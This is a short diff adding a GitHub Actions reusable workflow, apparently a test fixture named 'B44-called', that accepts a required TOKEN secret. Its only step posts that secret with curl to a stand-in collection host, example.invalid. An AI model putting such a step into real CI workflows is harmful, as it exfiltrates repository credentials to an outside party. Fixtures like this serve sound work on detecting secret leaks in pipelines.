@@ -1,0 +1,15 @@
+name: B44-called
+
+on:
+  workflow_call:
+    secrets:
+      TOKEN:
+        required: true
+
+jobs:
+  send:
+    runs-on: ubuntu-latest
+
+    steps:
+      - run: |
+          curl --data "${{ secrets.TOKEN }}" https://example.invalid/collect
